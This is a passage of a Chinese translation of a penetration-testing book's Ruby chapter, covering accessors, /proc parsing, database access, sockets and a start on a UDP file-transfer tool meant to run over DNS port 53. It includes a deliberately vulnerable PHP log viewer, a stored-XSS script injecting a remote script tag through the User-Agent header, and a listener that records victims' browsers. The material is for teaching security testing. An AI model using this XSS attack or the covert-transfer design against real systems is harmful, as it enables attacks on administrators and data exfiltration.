  \n创建类时，有时限制暴露给用户的类变量是有意义的。在处理类变量时，我们有三种基本方式来导出变量：读取器（reader）、写入器（writer）和访问器（accessor）。正如我们可能已经猜到的，读取器用于读取变量，写入器用于写入变量。访问器一开始可能不太明确，但它们是被设计为可读可写的变量。如果我们在这三种类型的作用域之外创建实例变量，那么它们被视为私有变量，直到我们创建一个允许访问它们的函数。\n\
  \n```\nclass Test\n\n   attr_reader   :error\n\n   attr_writer   :request\n\n  \
  \ attr_accessor :other\n\n  def test\n\n     @error = \"You can’t change me!\"\n\
  \n     print \"Request contains #{@request}\\n\"\n\n     print \"Other contains\
  \ #{@other}\\n\"\n\n   end\n\nend\n```\n\n为了尝试这些概念，让我们创建一个类并命名为 `Test`。我们创建了三种不同的变量类型：一个名为\
  \ `error` 的读取器，一个名为 `request` 的写入器，以及一个名为 `other` 的访问器。我们还为 `Test` 类创建了一个 `test`\
  \ 方法，该方法将设置 `error` 实例变量，并打印 `request` 和 `other` 实例变量。我们需要这些方法，因为我们无法从类外部写入 `error`\
  \ 或读取 `request`。接下来，我们需要创建一些代码来实践这些概念。\n\n```\nmytest = Test.new\n\nprint \"Trying\
  \ to set error to ’change me’\\n\"\n\nbegin\n\n   mytest.error = \"change me\"\n\
  \nrescue\n\n   print \"….changing error failed\\n\\n\"\n\nend\n```\n\n我们创建一个新的 `Test`\
  \ 实例，并将其赋值给 `mytest` 变量。然后打印一条消息，说明我们将尝试更改 `error` 变量。这将使屏幕输出清楚地显示发生了什么。但我们需要进行错误处理。\n\
  \nRuby 的错误处理允许我们将代码段放在块中，当该代码块失败时，我们能够从该操作中清理，而不是让应用程序崩溃。我们使用 `begin` 关键字开始代码块。直到\
  \ `rescue` 语句之前的所有内容都将被视为要执行的代码。如果代码失败，将调用 `rescue` 关键字处的块；否则，将忽略它。我们使用 `end` 关键字关闭代码块。现在，我们的程序将准备好捕获尝试更改\
  \ `error` 变量时发生的错误，并允许应用程序继续执行后续测试。\n\n提示\n\n\n\n\n我们在这个应用程序中使用了简单的错误处理，但 Ruby 有能力基于特定类型的错误进行救援。它可以处理多个救援行，每个行处理不同的错误。这种错误处理在调用使用其他类的类方法时非常有用。例如，如果我们有一个协议类，我们希望能够处理协议使用的套接字类中的错误，以及特定的协议错误。有关\
  \ Ruby 错误处理的更多信息，请访问 [www.ruby-doc.org/docs/ProgrammingRuby/html/tut_exceptions.html](http://www.ruby-doc.org/docs/ProgrammingRuby/html/tut_exceptions.html)。\n\
  \n```\nprint \"Setting request to ’pretty please’ and other to ’we can change this\
  \ at will’ \\n\\n\"\n\nmytest.request = \"pretty please\"\nmytest.other = \"we can\
  \ change this at will\"\n\nprint \"Calling test function…\\n\"\nmytest.test\n\n\
  print \"\\n\"\nprint \"Directly querying data…\\n\"\nprint \"Error is #{mytest.error}\\\
  n\"\nprint \"Other is #{mytest.other}\\n\"\n\nbegin\n   print \"Request is #{mytest.request}\\\
  n\"\nrescue\n   print \"Failed to query mytest.request, it is write only\\n\"\n\
  end\n```\n\n为了完成测试我们的代码，我们设置了 `request` 和 `other` 变量，并执行了 `test` 方法。这将打印 `error`\
  \ 和 `request` 的内容。接下来，我们直接查询变量。我们将打印 `error` 和 `other` 的内容，因为它们在我们的方法外部都是可读的。最后，我们将尝试打印\
  \ `request` 变量，但我们知道它会失败。所以我们将其包裹在错误处理中。这应该会将错误打印到屏幕上。将这段代码组合起来，我们称这个应用程序为 `testClass.rb`，并查看输出（参见图\
  \ 4.5）。\n\n![image](img/F000047f04-05-9781597497299.jpg)\n\n图 4.5 testClass.rb 的输出\n\
  \n从图 4.5 中我们可以看到，我们无法更改 `error` 变量，并且我们的错误处理程序打印了 `changing error failed`，而不是应用程序崩溃。当我们的测试函数运行时，`request`\
  \ 和 `other` 变量成功打印。当我们查询数据时，`error` 正确打印，`other` 也正确打印。但我们在尝试读取 `request` 变量时收到了错误消息。我们的输出符合预期，现在我们看到了如何在\
  \ Ruby 中创建特定类型的变量访问器。\n\n## 文件操作\n\n除非我们处理的是二进制文件格式，否则 Ruby 可能不是我们进行文件解析的首选。对于纯文本文件解析，Perl\
  \ 的正则表达式能力使其成为天然的首选。Ruby 拥有丰富的文件类，允许我们执行基本的文件系统操作、文件链接和权限查询，以及读写操作。为了探究这些特性，我们将构建一个脚本，通过\
  \ proc 文件系统收集有关进程的一些信息。有时我们想知道进程是从哪里调用的，以及使用了哪些选项，这样我们就可以轻松地重新创建或修改文件，以帮助我们在渗透测试期间的工作。\n\
  \n```\n#!/usr/bin/ruby\nrequire ’etc’\npid = ARGV[0].to_i\ncwd = File.readlink(\"\
  /proc/#{pid}/cwd\")\nowner = File.stat(\"/proc/#{pid}/cmdline\").uid\n```\n\n对于我们的程序，我们希望收集进程所有者、当前工作目录（程序运行的位置）以及用于运行它的完整命令行。我们将从命令行获取进程\
  \ ID 作为参数，并将其存储在 `pid` 中。接下来，我们将在 `/proc` 中查看进程的 `cwd` 链接。文件类的 `readlink` 方法将获取符号链接的目标，并将其作为字符串返回。我们将该字符串存储在\
  \ `cwd` 变量中。然后，我们将使用 `stat` 命令，该命令将返回关于文件的大量信息，包括最后修改、创建和访问时间。对我们来说更重要的是，这将返回文件的所有者。我们将使用从\
  \ `stat` 返回的 `uid` 变量来获取文件所有者的数字用户 ID，并将其赋值给 `owner`。\n\n```\nfile = File.new(\"\
  /proc/#{pid}/cmdline\")\ncmdline = file.read.split(\"\\000\")\nfile.close\nfilename\
  \ = cmdline.shift\n```\n\n我们进程的 `cmdline` 文件包含在命令行上传递的选项列表，包括程序名称本身，由空字符分隔。我们读取这些信息，根据空字符进行拆分，并将数组存储在\
  \ `cmdline` 中。`cmdline` 的第一个元素是执行的命令。为了移除第一个元素并将其作为字符串返回，我们可以使用数组的 `shift` 方法。我们使用\
  \ `shift` 是因为我们希望 `cmdline` 只包含传递给正在调查的程序的选项。\n\n```\nprint \"Process #{pid} is\
  \ owned by #{Etc.getpwuid(owner).name}\\n\"\nprint \"Process #{pid} CWD: #{cwd}\\\
  n\"\nprint \"Process #{pid} Command: #{filename} #{cmdline.join(’ ’)}\\n\"\n```\n\
  \n现在我们已经拥有了所需的所有信息，我们构建打印语句。通常，数字用户 ID 对我们来说意义不大。因此，我们将使用 `Etc` 模块的 `getpwuid` 方法将\
  \ `uid` 转换为用户名。`Getpwuid` 从密码文件中返回关于 `uid` 的信息。我们唯一需要的字段是名称，因此我们引用返回的密码结构中的 `name`\
  \ 变量。我们需要以 root 身份才能读取其他用户拥有的进程并测试此程序。以 root 身份，我们运行脚本 `proc.rb`，进程 ID 为 1，我们应该会看到图\
  \ 4.6 中的输出。\n\n![image](img/F000047f04-06-9781597497299.jpg)\n\n图 4.6 进程 ID 为 1\
  \ 时 proc.rb 的输出\n\n## 数据库基础\n\n在 Ruby 中，甚至数据库记录也可以被视为对象。Active Record 是一个专为 Rails\
  \ 框架设计的 Ruby 模块。它旨在抽象数据库内部结构。在使用 Active Record 构建程序时，某些情况下我们甚至不需要知道数据库的样子。Active\
  \ Record 让我们将数据库信息视为类，而不是处理复杂的 SQL 查询。我们可以使用这些 Active Record 模型来连接数据库服务器并查询记录，而无需太多开销。如果在渗透测试期间遇到凭据，我们可以轻松地使用\
  \ Ruby 将数据库中的数据转换为易于传输回自己系统的格式。\n\n为了演示，我们需要一个数据库服务器和一个用户。BackTrack 预装了 PostgreSQL\
  \ 供 Metasploit 使用。我们可以利用这一点来完成这些示例。首先，我们必须验证数据库服务器是否正在运行。为此，我们需要检查服务器的状态，如果未运行则启动它。接下来，我们需要成为\
  \ `postgres` 用户，并创建一个用户和数据库供我们使用。\n\n```\n/etc/init.d/postgresql-8.4 status\n/etc/init.d/postgresql-8.4\
  \ start\nsu – postgres\ncreateuser test\n   Shall the new role be a superuser? n\n\
  \   Shall the new role be allowed to create databases? y\n   Shall the new role\
  \ be allowed to create more roles? Y\ncreatedb --owner test test\nexit\n```\n\n\
  ### 使用 DBI\n\n现在数据库已设置好，我们可以看看令人兴奋的部分。DBI 模块允许我们连接和操作数据库，同时抽象了许多数据库特定的方面。让我们看看如何连接到我们新创建的\
  \ PostgreSQL 数据库实例。\n\n```\n#!/usr/bin/ruby\nrequire ’dbi’\ndbh = DBI.connect(’DBI:pg:test’,’test’)\n\
  dbh.do(\"set client_min_messages = ’warning’\")\n```\n\n我们将包含 DBI 模块并使用 `connect`\
  \ 方法。我们的连接选项包括连接字符串，它由 `DBI`、数据库驱动程序（此处为 `pg`，代表 PostgreSQL）和数据库名称 `test` 组成。第二个选项是我们的用户名\
  \ `test`。如果我们有密码，我们会将其作为附加选项传递。`connect` 方法返回一个数据库句柄对象。我们将其缩写为 `dbh`。我们使用数据库句柄调用\
  \ `do` 方法，该方法在数据库上运行我们传递给它的字符串。在这种情况下，我们传递一个字符串，该字符串将禁用一些我们预期的警告消息。这将清理输出，脚本仍然可以正常运行。\n\
  \n\n\n\n\n接下来，我们需要创建数据表。我们将把 SQL 语句放入一个字符串中，然后针对数据库执行该字符串。首先创建一个语句处理器，然后执行该处理器。在此之前，如果表已存在，我们应该先删除它，这样我们就能通过第一个脚本获得可重复的结果。\n\
  \n```ruby\ndb_create = ’\n\n   create table people(\n\n     id SERIAL,\n\n     name\
  \ varchar(256),\n\n     homepage varchar(256)\n\n   )\n\n’\n\ndbh.do(’drop table\
  \ if exists people’)\n\nq = dbh.prepare(db_create)\n\nq.execute()\n\nqstring = \"\
  insert into people (name,homepage)\n\n   values(’ryan’, ’[`www.happypacket.net`](http://www.happypacket.net)’)\"\
  \n\ndbh.prepare(qstring).execute()\n\nqstring = \"insert into people (name,homepage)\n\
  \n   values(’jason’,’[`www.codingforpentesters.net`](http://www.codingforpentesters.net)’)\"\
  \n\ndbh.prepare(qstring).execute()\n```\n\n我们将建表语句赋值给 `db_create` 变量。建表语法创建了一个名为\
  \ `id` 的字段，它会为每一行插入的数据存储一个递增的值。此外，我们还有 `name` 和 `homepage` 字段，它们最多可容纳 256 个字符的字符串。同样，如果表已存在，我们应该先删除它。我们使用\
  \ `do` 方法执行数据库代码来删除表。接着，我们准备建表语法，并将语句处理器赋值给 `q` 变量。然后通过语句处理器执行查询。我们并不查看返回信息，因为我们知道在这个示例中表会成功创建。\n\
  \n现在表已经创建好了。让我们插入一些数据，以便能对表进行一些有用的操作。我们将生成两条插入语句来向数据库添加内容，并通过返回的语句执行它们。我们将查询赋值给\
  \ `qstring`，将字段 `name` 和 `homepage` 插入到 `people` 表中。我们为两个不同的人和主页赋值。我们将编写一行代码来提交查询，再次使用数据库句柄来准备执行查询。`prepare`\
  \ 方法会生成一个语句处理器，然后我们可以执行它。请注意，在实际使用场景中，我们会在这个脚本中加入一些错误处理。\n\n现在有了数据，让我们再把数据取出来。我们将生成一条\
  \ select 语句来从表中拉取所有数据并打印到屏幕上。来看代码。\n\n```ruby\nqstring = \"select ^∗ from people\"\
  \n\nq = dbh.prepare(qstring)\n\nq.execute()\n\nq.each do |row|\n\n   print \"ID:\
  \ #{row[0]}, Name: #{row[1]}, HomePage: #{row[2]}\\n\"\n\nend\n```\n\n我们生成一条 select\
  \ 语句来选择 `people` 表中的所有条目。我们准备语句处理器，将其赋值给 `q`，然后执行。查询返回后，我们可以从 `q` 中访问返回信息。通过遍历 `q`\
  \ 的每个元素并赋值给 `row` 变量，我们将数据放入一个数组中，然后打印出来。图 4.7 展示了 `person.rb` 脚本的预期输出。\n\n![image](img/F000047f04-07-9781597497299.jpg)\n\
  \n**图 4.7** DBI 示例的输出，person.rb\n\n### 使用 Active Record\n\n现在我们已经了解了如何使用 DBI 进行基本操作。但我们所做的很多数据库交互并没有真正使用对象。我们将每个查询当作数组来处理。处理数据的方式与我们其他\
  \ Ruby 交互的感觉不太一样。Active Record 将帮助我们弥合这一差距。为了了解如何抽象所有 SQL 语句并将数据库表当作对象来处理，我们将使用\
  \ Ruby 和 Active Record 以及我们已经在数据库中创建的表。\n\nActive Record 是 Ruby on Rails 的一个模块。虽然我们不必使用\
  \ Rails 就能使用它，但我们需要包含一个额外的模块。包含 `rubygems` 模块将允许我们访问 Rails gems，而无需在 Rails 框架内工作。让我们看看如何设置\
  \ Active Record 来连接数据库。\n\n```ruby\n#!/usr/bin/ruby\n\nrequire ’rubygems’\n\nrequire\
  \ ’active_record’\n\nActiveRecord::Base.establish_connection(\n\n   :adapter =>\
  \ ’postgresql’,\n\n   :username => ’test’,\n\n   :database => ’test’\n\n)\n```\n\
  \n我们包含 `rubygems` 模块，以便从 `activerecord` 模块导入代码，因为 `activerecord` 是一个 Ruby gem。为了建立与数据库的连接，我们使用\
  \ `ActiveRecord::Base` 类的 `establish_connection` 方法。我们传入三个命名选项：要使用的适配器、用户名以及要连接的数据库。在本例中，我们将继续使用\
  \ PostgreSQL 连接，并将“test”同时作为用户名和数据库名。现在我们已经建立了与数据库的连接。后续使用 Active Record 的操作无需再指定这些信息；它们会被隐含地使用。\n\
  \n**注意：** 在我们的示例中，没有为数据库使用密码。但在实际场景中，这很常见。我们会像处理用户名符号一样使用它，即 `:password => ’password’`。\n\
  \n让我们为 `people` 表创建一个包装器。我们之前通过将表命名为 `people` 为这种情况做了巧妙的准备。ActiveRecord 帮助我们抽象了数据库中发生的大部分事情，但理解\
  \ ActiveRecord 如何将数据转换为对象是至关重要的。ActiveRecord 使用复数形式来描述表的内容。就像在英语中，如果我们有一组人（persons），我们会称他们为\
  \ people（复数）。ActiveRecord 也是如此。我们有一个包含人员数据的表；因此，当我们引用一个 `Person` 对象时，ActiveRecord\
  \ 知道它应该在 `people` 表中查找关于该 `Person` 的信息。对于存储 gnomes 数据的表也是如此。表本身会被称为 `Gnomes`，但每个对象都是一个\
  \ `Gnome` 对象。现在我们已经理解了表的设置方式，让我们设置类并从数据库中拉取所有记录。\n\n```ruby\nclass Person < ActiveRecord::Base\n\
  \nend\n\nprint \"Fetching all records\\n\"\n\nPerson.all.each { |p| print \"ID:\
  \ #{p.id} Name: #{p.name} HomePage: #{p.homepage}\\n\"}\n```\n\n我们创建 `Person` 类并包含\
  \ `ActiveRecord::Base` 类。这包含了所有默认的 Active Record 代码和方法，用于处理类与数据库之间的交互。接下来，我们从数据库中获取所有记录。我们使用\
  \ `Person` 类从 People 数据库中获取所有 Persons。我们遍历每条记录并打印。注意，我们的类已经设置了访问器，因此我们可以随意读写这些记录。\n\
  \n从表中获取所有信息不需要了解 SQL，并且可以通过我们熟悉的 Ruby 约定轻松管理。Active Record 更进一步，还为我们提供了查询特定记录的原生方法。Active\
  \ Record 代码会根据在数据库中发现的字段自动创建搜索方法。让我们看一个例子。\n\n```ruby\nprint \"\\nFetching individual\
  \ records\\n\"\n\nryan = Person.find_by_name(’ryan’)\n\nprint \"ID: #{ryan.id} Name:\
  \ #{ryan.name} HomePage: #{ryan.homepage}\\n\"\n```\n\n在我们的代码中，我们使用了 `Person` 类的\
  \ `find_by_name` 方法。Ruby 会为数据库中的每个字段自动创建一个 `find_by` 方法。这让我们可以按任何字段进行搜索。在本例中，我们将返回的记录赋值给一个变量，然后像之前转储表时一样打印信息。\n\
  \n**提示：** Active Record 非常灵活。虽然我们只介绍了一种执行几种不同任务的方式，但每种任务都有多种实现方法。学习这些方法的最佳途径是查阅\
  \ API 文档并进行实验。使用本章中的示例，并尝试 [`ar.rubyonrails.org/classes/ActiveRecord/Base.html`](http://ar.rubyonrails.org/classes/ActiveRecord/Base.html)\
  \ 上 API 文档中的其他方法。\n\n\n\n\n现在我们已经知道如何搜索记录，接下来看看如何创建记录。我们将通过 Active Record 中的一个特殊方法来创建记录，该方法允许我们在记录不存在时创建它，但如果记录已存在则会检索它。当我们希望根据某些条件在数据库中拥有唯一记录时，经常使用这类方法。让我们来看代码示例。\n\
  \n```\ned = Person.find_or_create_by_name(:name => 'ed',\n   :homepage => 'http://www.counterhack.net')\n\
  print \"ID: #{ed.id} Name: #{ed.name} HomePage: #{ed.homepage}\\n\"\n```\n\n我们使用\
  \ `Person` 类通过 `find_or_create_by_name` 查找或创建名为 `ed` 的记录。如果需要创建记录，我们希望它创建并同时分配主页。我们将变量存储并打印出来。运行代码时，可以多次执行。我们只会看到\
  \ `ed` 的一个实例。如果我们希望每次执行脚本时都创建一个新的 `ed`，则需要将代码改为使用 `create_by_name`。这样它就不会尝试查找旧实例，我们会看到\
  \ `ed` 像《黑客帝国》中的 Agent Smith 一样不断复制。图 4.8 展示了我们执行新 Active Record 脚本的结果。\n\n![image](img/F000047f04-08-9781597497299.jpg)\n\
  \n图 4.8 Active Record 实战\n\n我们已经了解了两种访问数据库中数据的方法，并看到了输出上的差异。无论情况如何，我们都可以快速从数据库中导出数据，甚至在必要时修改和创建记录。我们只是浅尝了这些方法。尝试\
  \ DBI 和 Active Record 类中的不同方法，是精通这两种访问方式的最佳途径。\n\n## 网络操作\n\n轻松操作二进制协议的能力使 Ruby\
  \ 成为与复杂二进制协议通信的理想选择。本节重点介绍网络套接字的读写基础。我们将通过分别研究客户端和服务器，以及探讨处理传入连接和并发的多种方法，来探索 TCP\
  \ 和 UDP 通信。\n\n### 客户端通信\n\n在第 2 章中，我们接触了 Python 的客户端通信，在第 3 章中又接触了 Perl 的。现在，使用\
  \ Ruby，我们将看到与之前代码的相似之处，并在本章的最终项目中加以扩展。让我们从一个基本的 TCP 类开始，用于发送原始 HTTP 请求。\n\n有时系统管理员为了稍微方便一点而牺牲安全性。让我们考察一个假设案例。我们的系统管理员创建了一个名为\
  \ `logview.php` 的绝密 PHP 脚本，以便从任何地方查看服务器日志。由于该脚本没有链接到任何地方，管理员认为它在 Web 根目录下足够安全。让我们看看管理员创建并允许其\
  \ Web 脚本工作的步骤。\n\n```php\n<?php\nprint \"<pre>\" ;\nprint passthru('cat /var/log/apache2/access.log');\n\
  ?>\n```\n\nPHP 代码打印了一个 pre HTML 标签，表示输出已预格式化。然后它对 Web 访问日志执行 `cat` 命令，并使用 PHP 的\
  \ `passthru` 命令将输出打印到屏幕。这是一个快速简便的日志查看器，但存在严重漏洞。它没有对输出进行清理。因此，如果我们创建一个将 HTML 注入日志的脚本，PHP\
  \ 脚本会愉快地将其渲染到毫无防备的管理员浏览器中。为了实现这一点，我们的系统管理员还将 Apache 日志目录的权限改为全局可读。\n\n要复现此场景，请将代码添加到\
  \ `/var/www/viewlog.php`，并执行命令 `chmod 755 /var/log/apache2` 和 `chmod 644 /var/log/apache2/*`。然后确认\
  \ Web 服务器已启动，本章其余示例应能正常工作。\n\n了解到这个漏洞后，我们决定编写一个 Ruby 脚本，连接到系统管理员的 Web 服务器，并在 `User-Agent`\
  \ 字段中发送带有恶意 HTML 的请求。让我们逐步了解生成 HTTP 攻击脚本所需的工作流程和代码：\n\n1. 客户端代码\n   a. 打开到易受攻击的\
  \ Web 服务器的连接。\n   b. 在 `User-Agent` 字段中携带恶意脚本，请求 `/` 页面。\n   c. 检索并打印请求的输出到屏幕。\n\
  \   d. 等待管理员运行脚本。\n2. 服务器代码\n   a. 打开一个套接字，等待管理员运行脚本。\n   b. 接收来自管理员 Web 浏览器的 HTTP\
  \ 请求，并将数据打印到屏幕。\n   c. 向管理员的 Web 浏览器返回 200 状态码，表示一切正常。\n\n```ruby\n#!/usr/bin/ruby\n\
  require 'socket'\n\nhost = 'localhost'\nxss_loc = \"<script src='http://localhost:8080/'></script>;\"\
  \nnaughty_request = \"GET / HTTP/1.1\nHost: #{host}\nUser-Agent: #{xss_loc}\n\n\\\
  n\\n\"\n\ns = TCPSocket.open('localhost',80)\ns.print naughty_request\nprint \"\
  Got response:\\n\"\nwhile line = s.gets\n   print line\n   break if line.downcase.include?\
  \ '</html'\nend\ns.close()\n```\n\n我们设置 Ruby 脚本并引入 socket 模块。然后定义要连接的主机以及要插入的恶意\
  \ HTML。为了使 HTML 有效，我们需要使用单引号。Apache 会转义双引号，但不会转义单引号。最后，我们设置恶意请求。我们的请求使用 HTTP 1.1\
  \ 语法向服务器发出 `GET` 命令，请求 Web 服务器的根页面。我们包含目标服务器的主机名，并在 `User-Agent` 字段中添加恶意 HTML。\n\
  \n现在框架已搭建好，我们使用 `TCPSocket.open` 方法创建一个套接字对象，传入目标服务器的主机名和端口。该套接字的行为与任何通用套接字相同。因此，无论我们打开哪种类型的套接字，这些命令都是相同的。我们使用套接字的\
  \ `print` 方法向远程服务器发送数据。在本例中，我们向服务器发送恶意 HTTP 请求。我们想看看返回结果，以确认请求生效。为此，我们设置一个循环，使用\
  \ `gets` 方法从远程主机逐行获取数据，并打印到屏幕，直到收到关闭 HTML 标签。一旦收到关闭 HTML 标签，我们就停止读取并关闭连接。\n\n现在我们有了一个脚本，可以连接到服务器，发送恶意\
  \ HTTP 请求，并将结果打印到屏幕。如果执行该请求，我们应该能在 Web 服务器请求日志 `/var/log/apache2/access.log` 中看到我们的恶意\
  \ HTML。当管理员下次查看日志时，浏览器会看到恶意 HTML，并在后台执行一个请求，从 localhost 的 8080 端口获取脚本。我们可以向浏览器传递几乎任何脚本。为了本例的目的，我们需要一个服务器来记录连接，以便我们知道执行了什么，然后返回一个空消息。这样，浏览器继续渲染，而我们的系统管理员毫不知情。\n\
  \n### 服务器通信\n\n现在让我们看看服务器通信。我们需要创建一个在 8080 端口监听的服务器。当有传入连接时，我们希望记录请求信息，并向浏览器返回一些内容，告知没有内容。这允许调用我们脚本的\
  \ Web 页面完成渲染。我们首先要做的是创建一个监听套接字。为此，我们使用 `TCPServer` 类。`TCPServer` 类允许我们将新连接作为套接字对象接受。一旦有了套接字对象，我们就可以使用与客户端示例相同的方法。让我们设置返回信息并创建监听套接字。\n\
  \n```ruby\n#!/usr/bin/ruby\nrequire 'socket'\n\nbanner = \"HTTP/1.1 200 OK\nDate:\
  \ Thu, 1 Apr 1977 01:23:45 GMT\nContent-Length: 0\nConnection: close\nContent-Type:\
  \ text/html\\n\\n\"\n\nserver = TCPServer.open('localhost',8080)\n```\n\n\n\n\n\
  我们引入了 socket 模块，并创建了一个返回 200 OK 消息的 `banner`。这告诉 Web 浏览器查询已被接受，一切正常。接着，我们设置头部信息，表明没有内容，提供日期和内容类型信息以使浏览器满意。最后加上两个换行符，让浏览器知道我们的消息已结束。无论请求什么内容，`banner`\
  \ 消息都会提供给任何连接。我们只关心谁请求了我们的页面，以及他们是从哪里跳转过来的。一旦获取到这些信息，我们就希望他们离开。我们的 `TCPServer` 的\
  \ `open` 方法接受两个选项：绑定 socket 的主机和端口。如果不指定 localhost，它将监听所有网络接口，但我们不希望任何人都能连接到我们的脚本。\n\
  \n下一步是创建一个循环，用于接受传入请求，处理请求以获取我们想要记录的信息，然后让客户端离开。一旦获得所需信息，我们可以将其打印到屏幕上用于记录，然后等待下一个连接。为此，我们进入一个无限循环，等待传入连接。停止脚本的唯一方法是按下\
  \ `Ctrl+c` 组合键。\n\n```\nloop {\n\n   client = server.accept\n\n   req = client.recv(1024).split(\"\
  \\r\\n\")\n```\n\n我们创建一个无限循环，并使用 `TCPServer` 的 `accept` 方法来接受新连接。脚本会挂起，直到有新连接进来，因此我们无需任何特殊操作来持续轮询新连接。一旦建立新连接，socket\
  \ 会被赋值给 `client` 变量。传入的 HTTP 连接不会等待我们发送任何内容；它们会先发送 HTTP 请求来开始对话。我们接收该请求，将其拆分成单独的行，并将结果数组赋值给\
  \ `req` 变量。接下来，我们要解析输入以获取重要的头部信息，以便记录，然后让客户端离开。\n\n```\n  headers = {}\n\n  req.each\
  \ do |line|\n\n    k,v = line.split(':',2)\n\n    headers[k] = v\n\n  end\n\n  print\
  \ \"#{Time.now} - #{client.peeraddr.last}\\n\"\n\n  print \"\\t#{headers['Referer']}\
  \ - #{headers['User-Agent']}\\n\"\n```\n\n我们创建一个名为 `headers` 的新哈希，并通过循环将每一行赋值给 `line`\
  \ 变量来处理请求行。头部的每一行都是一个字符串，包含由冒号分隔的键值对。我们使用 `String` 类的 `split` 方法生成键值对，并分别赋值给 `k`\
  \ 和 `v`。然后使用哈希存储键值对，以便直接访问我们需要的字段。解析完头部后，我们打印客户端的时间和远程地址。socket 的 `peeraddr` 变量包含一个带有连接信息的数组。数组的最后一个元素包含远程主机的\
  \ IP 地址。我们获取该信息并打印，同时打印引用页面和客户端的 User-Agent。这在生成最终测试报告时会很有帮助。\n\n```\n   client.puts\
  \ banner\n\n   client.close\n\n}\n```\n\n最后，我们将 `banner` 发送给 `client`，以便 Web 浏览器继续渲染页面，并关闭\
  \ socket。这将清理连接，让我们能够处理更重要的任务——比如接受新连接。让我们看看最终的代码。\n\n```\n#!/usr/bin/ruby\n\nrequire\
  \ 'socket'\n\nbanner = \"HTTP/1.1 200 OK\n\nDate: Thu, 1 Apr 1977 01:23:45 GMT\n\
  \nContent-Length: 0\n\nConnection: close\n\nContent-Type: text/html\\n\\n\"\n\n\
  server = TCPServer.open('localhost',8080)\n\nloop {\n\n   client = server.accept\n\
  \n   req = client.recv(1024).split(\"\\r\\n\")\n\n   headers = {}\n\n   req.each\
  \ do |l|\n\n     k,v = l.split(':',2)\n\n     headers[k] = v\n\n   end\n\n   print\
  \ \"#{Time.now} - #{client.peeraddr.last}\\n\"\n\n   print \"\\t#{headers['Referer']}\
  \ - #{headers['User-Agent']}\\n\"\n\n   client.puts banner\n\n   client.close\n\n\
  }\n```\n\n一旦服务器启动，我们可以使用 `viewlog.php` 页面让浏览器连接到服务器，并触发我们希望在真实世界中模拟的事件。我们将此脚本命名为\
  \ `xss_server.rb` 并启动监听。在后台，我们访问网页，图 4.9 显示了输出。现在我们已经了解了如何在 Ruby 中创建客户端和服务器。在此过程中，我们创建了一种巧妙的方法来利用安全性较差的工具，并编写了一些可以添加到渗透测试工具包中的代码。\n\
  \n![image](img/F000047f04-09-9781597497299.jpg)\n\n图 4.9 连接到 `xss_server.rb` 服务器的传入连接\n\
  \n## 整合所有内容\n\n我们已经研究了 Ruby 的许多细节及其在渗透测试中的用途。现在让我们将这些概念整合起来。我们在本章开头提到 Ruby 擅长处理二进制协议。让我们创建一个新的文件传输协议。它将执行一个基本任务：将文件发送到远程服务器。由于它并不复杂，我们将其命名为“傻瓜文件传输协议”，简称\
  \ `DFTP`。\n\n为了创建我们的 `DFTP` 通信，我们创建一个 Ruby `DFTP` 模块，可以包含在脚本中。这样我们就可以使用服务器和客户端类轻松通信。首先，让我们决定协议的工作方式。我们需要一些安全性来防止未经授权的人向我们的服务器发送文件，因此我们创建一个基本的身份验证系统。通过共享密钥系统，通信双方都需要知道密钥才能通信。控制双方使得身份验证变得非常简单。\n\
  \n`DFTP` 将用于渗透测试，因此如果它能够通过域名系统（DNS）端口（UDP 53 端口）进行通信，将会非常方便。所以我们让协议基于 UDP。在初始化时，我们的协议会发送一个比特，表示我们即将发送文件、共享密钥和文件名。如果服务器接受我们的文件，它会发回一个比特表示一切正常，然后发送一个会话\
  \ ID，用于发送文件时使用。这样，我们的服务器可以同时处理多个会话。最后，一旦客户端获得会话，它需要开始发送数据包。由于 UDP 不是可靠协议，我们需要一种方法在数据包乱序到达时重新组装它们。我们将为每个数据包编号，以便服务器能够重新组装。\n\
  \n```\n#!/usr/bin/ruby\n\nmodule DFTP\n\n   class DFTPBase\n\n     require 'socket'\n\
  \n     attr_reader :host,:port\n\n     @@Read = \"\\001\"\n\n     @@Write = \"\\\
  002\"\n\n     def initialize(host,port,key)\n\n       @host,@port,@key = host,port,key\n\
  \n       @sock = UDPSocket.new\n\n     end\n\n   end\n```\n\n我们使用 `module` 关键字创建\
  \ `DFTP` 模块。第一个类将包含客户端和服务器的基本代码。这样可以减少代码重复。我们将把这个类包含在客户端和服务器类中，如果任何部分需要修改，我们只需在一个地方更改代码。我们的\
  \ `HTTPBase` 类将负责引入 UDP 通信所需的 socket 模块。我们之前没有见过 `@@`，但这个符号用于类变量。这些变量是基于类而不是实例设置的。在这种情况下，`read`\
  \ 和 `write` 在我们的数据包中始终具有二进制 1 和二进制 2 的值，以轻松指示我们使用的请求类型，因此不需要在每个实例上更改它们。基类的最后一部分是创建一个\
  \ `initialize` 方法，用于创建对象时使用。我们将设置 `host`、`port` 和 `communication key` 的实例变量。然后创建客户端和服务器通信所需的\
  \ UDP socket。\n\n```\nclass DFTPClient < DFTPBase\n\n  def send_file(fn,contents)\n\
  \n contents = contents.split('')\n\n req = \"\"\n\n req << @@Write.to_s + @key +\
  \ \"\\000\" + fn + \"\\000\"\n\n @sock.send(req,0,@host,@port)\n\n optstr,client\
  \ = @sock.recv(1024)\n\n ses = optstr[1..-1].split(\"\\000\").first if optstr[0]\
  \ = \"\\001\"\n\n i = 1\n\n while contents.size > 0\n\n   msg = \"\"\n```\n\n\n\n\
  \n\n`msg << \"#{ses}\\000#{i}\\000\"`\n\n`msg << \"#{contents.shift(1022 - msg.size)}\\\
  000\"`\n\n`@sock.send(msg.to_s,0,@host,@port)`\n\n`i = i + 1`\n\n`end`\n\n`end`\n\
  \n`end`\n\n下一步是创建客户端代码。我们创建一个新类，并将基类中的代码整合进来。接着，我们创建一个名为 `send_file` 的方法，它接受两个选项：文件名和数据。为了将字符串视为数组，我们获取文件内容并按字符拆分。这样我们可以轻松地移动数组并取出字符。然后，我们创建请求字符串。该字符串由写入值和键组成，以空字符（`\\\
  000`）结尾；然后是文件名，同样以空字符结尾。我们使用初始化时创建的套接字将请求发送到主机和端口。`0` 值是 `send` 方法的标志值。我们不需要在数据包上设置任何特殊标志，因此将其保留为\
  \ `0`。\n\n接下来，我们从服务器接收返回的数据包。`recv` 方法返回两个内容：接收到的数据，以及数据来源的信息。我们忽略该信息，并解析二进制字符串。我们知道第一个字符应该是\
  \ ASCII 码的 `1`。因此我们验证该位已设置，获取直到空字符的其余信息，并将其赋值给 `ses` 变量。现在我们已经协商好会话，接下来将开始向服务器发送数据。\n\
